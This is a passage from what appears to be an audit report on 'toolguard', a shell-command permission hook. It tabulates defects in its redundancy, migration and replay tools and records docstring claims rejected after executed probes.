two, or the covering layer itself, holds a `deny`/`ask` whose normalised body equals or subsumes the pattern. The docstring now states the limitation plainly, so this is a defect with a warning on it, not a silent one. |
| **HR2** | **`CrossLayerRedundancy.note`'s generated text asserts what HR1 shows is untrue.** The string ends `"the more-specific copy is redundant and can be dropped."` -- this is the sentence a user of the maintenance skill actually reads, and per HR1 dropping the copy can turn an `allow` into a `deny`. Strings are code; **not touched** in this pass, so the code and the docstring above it now disagree by design. | `toolguard/tools/hierarchy.py:find_cross_layer_redundancies`, the `note=` f-string | Reword to what the scan established, e.g. `"...; the more-specific copy is a candidate for removal (allow lists only -- an intervening deny/ask was not checked)."` Fix together with HR1, or the wording will have to change twice. |
| **HR3** | **A duplicate rule spanning two layers at the SAME specificity is found by neither redundancy engine.** `hierarchy._nearest_broader_cover` filters on `spec > specificity` (strict), and `redundancy.find_static_duplicates_across_layers` deliberately scans within each layer only. Executed 2026-08-12 with `~/.claude/toolguard_hook.toml` (specificity 2, `source_type='toolguard_hook'`) and a rules-directory file (specificity 2, `source_type='toolguard_hook_rules'`) both holding `allow git status:*`: `find_cross_layer_redundancies` returned `[]` and `find_static_duplicates_across_layers` returned `[]`. This is not hypothetical -- `config.py:_discover_levels` places every rules-directory file at the SAME specificity as `~/.claude` by design, so splitting rules across `~/.claude/toolguard_hook.toml` and `~/.config/toolguard/rules/*.toml` is exactly the configuration that produces it, and it is the split the project documents. | `toolguard/tools/hierarchy.py:_nearest_broader_cover` vs `toolguard/tools/redundancy.py:find_static_duplicates_across_layers` | Neither module is wrong on its own terms; the gap is between them. A same-specificity duplicate has a real ordering rule behind it (`_discover_levels` orders `~/.claude` first, so it wins), which makes the later copy genuinely dead -- so this is reportable, and arguably the *safest* redundancy finding of the three kinds, since no specificity boundary is crossed. |
| **HR4** | **`HierarchyMigration.list_type` is recorded, serialised, and never acted on.** `migrate_config` composes two `with_layer_allow_replaced` calls and never reads the field, so a `HierarchyMigration(list_type='deny', ...)` silently moves an ALLOW rule; `migration_effect_to_dict` then emits `"list_type": "deny"` into the JSON the audit reads. Nothing constructs a non-`'allow'` value today (the only constructors are the tests), which is why it has never bitten. | `toolguard/tools/hierarchy.py:migrate_config`, `HierarchyMigration.list_type` | Either drop the field, or route through the section-generic `config_access.with_layer_rules_replaced` (which already takes a `list_type`) and honour it. The field's docstring now says it is not acted on. |
| **HR5** | **`SingleDecision.matches_observed` is `False` for every `ASK`-status corpus entry, and toolguard's own log writes `ASK` for every ask verdict.** `_verdict_matches_status` recognises `EXECUTED` and `REFUSED` and returns `False` for everything else; `hook.py:_log_non_allow_decision` logs `status="ask"`, which `log_writer.py` uppercases to `ASK`, and `transcript_harvest` additionally emits `ERROR` and `UNKNOWN`. Executed 2026-08-12 against a config that allows the command: `EXECUTED -> True`, `executed -> True` (the `.upper()` makes it case-insensitive), and `REFUSED`/`ASK`/`ERROR`/`UNKNOWN` all `-> False`. So a caller reading `matches_observed` as "the replay agrees with reality" counts every asked command as a disagreement. **No non-test caller exists** -- `replay_single` is imported only by `test/unit/test_tools_replay.py` -- so this is latent, not live. | `toolguard/tools/replay.py:_verdict_matches_status`, `replay_single` | Two directions, and the choice depends on whether `replay_single` earns its keep at all: add `if status_upper == "ASK": return verdict == "ask"`, or return a tri-state (`corroborates` / `contradicts` / `no evidence`) so `ERROR`/`UNKNOWN` stop masquerading as contradictions. If nothing is ever going to call it, deleting `replay_single` + `SingleDecision` + `_verdict_matches_status` is the cheaper answer. |

### Rejected during this pass, with evidence

- **The "alembic landmine" paragraph in `replay.py`'s module docstring** -- **false as written, and cut rather than corrected.** It claimed that `uv run alembic <sub>:*` rules in `allow` coexisting with `uv run alembic:*` in `ask` means "a naive consolidation of the allow rules into `uv run alembic:*` would silently turn the `ask` into `allow` for ALL alembic commands". It named no layer. Executed 2026-08-12 with all of them in ONE layer: `ask` beats `allow` there, so the consolidation *tightens* -- `uv run alembic upgrade head` goes `allow -> ask` and `uv run alembic downgrade -1` stays `ask`. The claim only holds when the allow rules sit in a MORE SPECIFIC layer than the ask rule; with the allows at project level and `ask uv run alembic:*` at user level, `downgrade -1` really does go `ask -> allow`. The test that reads as backing the narrative does not exercise it either: `test_tools_replay.py:test_alembic_landmine_broadening_detected` says in its own comments that it substitutes `no_match_fallback='deny'` for the ask rule ("ask == denied by pattern in the more-specific-wins model for our test"), so no `ask` pattern appears in its fixture at all. Cut rather than fixed: the hazard belongs to `consolidate.py`, and the module docstring's job here is the corpus-scope limit, which is now stated directly.
- **"`decision_neutral` proves the move is safe for the current context"** (`MigrationEffect`) and **"a proposed config change is safe when the diff contains no `broadened` entries"** (`replay`) -- both false, both corrected in place rather than rejected; see the pass report. Recorded here only so the two sentences are not re-introduced from an older draft.
- **`permissions.match_command`'s multi-token DEFAULT over-match (tickets 17/18)** -- real, but neither file makes any claim about what a pattern covers: `replay.py` compares whatever `decide` returns, and `hierarchy.py` compares normalised pattern BODIES for equality, never matching a command against a pattern. Nothing to correct in either file. HR1's `git push:*` probes are unaffected -- they turn on layer precedence, not on prefix matching.

### Refactoring candidates surfaced by the comment sweep

**None.** The comments did not cluster in either file. `replay.py` is two loops of ten lines and four one-line accessors; `hierarchy.py`'s longest function is `find_cross_layer_redundancies` at 30 lines, whose two passes are already one clean loop each with the comparison extracted into `_nearest_broader_cover`. HR1's fix is a predicate change inside that helper, not an extraction.
